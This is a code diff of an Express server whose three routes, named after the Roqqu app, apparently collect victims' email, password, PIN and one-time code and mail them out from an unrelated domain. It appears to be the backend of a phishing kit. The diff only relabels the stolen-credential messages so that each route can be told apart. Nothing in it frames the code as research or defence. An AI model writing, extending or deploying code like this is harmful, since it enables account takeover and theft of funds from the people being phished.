@@ -68,7 +68,7 @@ app.post('/roqquappchat', (req, res, next) => {
     console.log('req body', req.body)
 
     const { email, password, pin, otp } = req.body
-    const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> checking`
+    const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> </br> checking - New message from Roqquappchat`
   
 
     const mail = {
@@ -113,7 +113,7 @@ app.post('/roqquapp', (req, res, next) => {
     console.log('req body', req.body)
 
     const { email, password, pin, otp } = req.body
-    const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> checking`
+    const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> </br> checking - New message from Roqquapp`
 
     const mail = {
         from: 'admin@growveonct.com',
@@ -157,7 +157,7 @@ app.post('/roqqu-app', (req, res, next) => {
     console.log('req body', req.body)
 
     const { email, password, pin, otp } = req.body
-    const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> checking`
+    const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> </br> checking - New message from Roqqu-app`
 
     const mail = {
         from: 'admin@growveonct.com',
